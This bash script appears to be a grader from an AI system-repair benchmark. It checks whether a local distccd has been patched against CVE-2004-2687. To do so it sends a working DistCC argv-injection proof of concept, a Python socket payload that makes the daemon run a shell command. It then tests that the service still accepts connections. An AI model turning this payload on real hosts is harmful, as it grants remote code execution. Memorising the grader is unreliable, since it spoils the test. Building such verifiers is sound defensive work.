#!/bin/bash
# Scenario 15: DistCC Unrestricted Access -> RCE (CVE-2004-2687)
#
# BEHAVIOURAL verifier. It speaks the real DistCC protocol to the RUNNING
# distccd and asks it to run a command (the argv-injection that distccd will
# execute as a "compiler"). If the command's output comes back, the box is
# exploitable. It does NOT grep the --allow flag or /start.sh, and it NEVER
# starts distccd -- a dead daemon is a real failure.
#
# The remediation keeps distccd running but restricts --allow to a trusted
# non-loopback range, so this localhost PoC is denied by the access list while
# the compile farm stays available. Editing /start.sh without restarting the
# live daemon leaves it exploitable (notrestart => FAIL).
#
# PoC checks:        the localhost argv-injection no longer executes a command
# Regression checks: distccd runs and still ACCEPTS a TCP connection (proving a
#                    block-all mitigation was not used in place of --allow)
#
# Exit 0 = every check passed, Exit 1 = at least one failed, Exit 42 = N/A.
#
# Two-component protocol: every check is recorded with its kind and NOTHING
# aborts early. See lib/verifylib.sh.
#
# NO UNREACHABILITY GATING NEEDED: this is an RCE PoC — a dead distccd genuinely
# cannot execute the injected command, so a killed daemon correctly reads as
# "no RCE". The collateral damage is caught by the regression component, which
# requires the TCP handshake to still succeed; a killed or firewalled-off daemon
# fails it. That is exactly the security-true / regression-false pair that makes
# this scenario CDR-eligible.
set -u

# The guard is load-bearing: under the harness scorer.py has already inlined the
# library and set this, so the agent-writable /tmp path is never read.
[ -n "${_SYSREPAIR_VERIFYLIB_LOADED:-}" ] || . "${SYSREPAIR_VERIFYLIB:-/tmp/verifylib.sh}"

HOST=127.0.0.1
PORT=3632

# Regression: distccd must already be running; the verifier must not start it.
if pgrep -x distccd >/dev/null 2>&1; then
    record_reg distccd_running 1
else
    record_reg distccd_running 0 "distccd is not running (verify.sh must not start it)"
fi

# Regression: wait (bounded) for the port to accept connections.
UP=0
for i in $(seq 1 20); do
    if ss -tln 2>/dev/null | grep -q ":$PORT " || netstat -tln 2>/dev/null | grep -q ":$PORT "; then
        UP=1; break
    fi
    sleep 1
done

if [ "$UP" = "1" ]; then
    record_reg distccd_listening 1
else
    record_reg distccd_listening 0 "distccd is not listening on port $PORT -- service down/broken"
fi

# PoC: DistCC argv injection. Send a job whose "compiler" argv is
# `sh -c 'echo <marker>'`; distccd executes it and returns stdout in the SOUT
# token. Seeing the marker == arbitrary command execution.
MARKER="DISTCC_RCE_$$_$(date +%s)"
POC_OUT=$(MARKER="$MARKER" python - "$HOST" "$PORT" <<'PYEOF' 2>/dev/null
import socket, sys, os
host = sys.argv[1]; port = int(sys.argv[2])
marker = os.environ["MARKER"]
argv = ["sh", "-c", "echo " + marker, "#", "-c", "main.c", "-o", "main.o"]
req = "DIST%08x" % 1
req += "ARGC%08x" % len(argv)
for a in argv:
    req += "ARGV%08x" % len(a) + a
doti = "int main(){return 0;}\n"
req += "DOTI%08x" % len(doti) + doti
try:
    s = socket.socket(); s.settimeout(10); s.connect((host, port))
    s.sendall(req)
    data = ""
    while True:
        b = s.recv(4096)
        if not b:
            break
        data += b
    s.close()
except Exception:
    data = ""
sys.stdout.write(data)
PYEOF
) || true

if echo "$POC_OUT" | grep -q "$MARKER"; then
    record_poc distcc_rce_denied 0 \
        "distccd executed an injected command via the DistCC protocol (marker '$MARKER' returned in the SOUT token) -- remote code execution"
else
    record_poc distcc_rce_denied 1
fi

# Regression: the daemon is still up and REACHABLE for legitimate clients.
#
# A listening-socket check alone is firewall-agnostic: an `iptables -j DROP` (or
# any block-all mitigation) that denies EVERY client — including the trusted
# compile farm — would leave the socket in LISTEN yet make the PoC time out, so
# a total block would masquerade as the intended `--allow` restriction. The
# correct fix (scope --allow to a trusted range) keeps distccd ACCEPTING TCP
# connections (it completes the handshake, then denies the job by client IP),
# whereas a block-all mitigation drops the SYN and the connection never
# establishes. So we require the TCP handshake itself to still succeed.
CONN=$(python - "$HOST" "$PORT" <<'PYEOF' 2>/dev/null
import socket, sys
host = sys.argv[1]; port = int(sys.argv[2])
s = socket.socket(); s.settimeout(5)
try:
    s.connect((host, port))
    sys.stdout.write("CONNECT_OK")
except Exception:
    sys.stdout.write("CONNECT_FAIL")
finally:
    s.close()
PYEOF
) || true

if [ "$CONN" = "CONNECT_OK" ]; then
    record_reg distccd_accepts_tcp 1
else
    record_reg distccd_accepts_tcp 0 \
        "distccd did not accept a TCP connection on port $PORT — the service has been blocked/bricked for ALL clients, not merely restricted to a trusted range"
fi

verify_finish
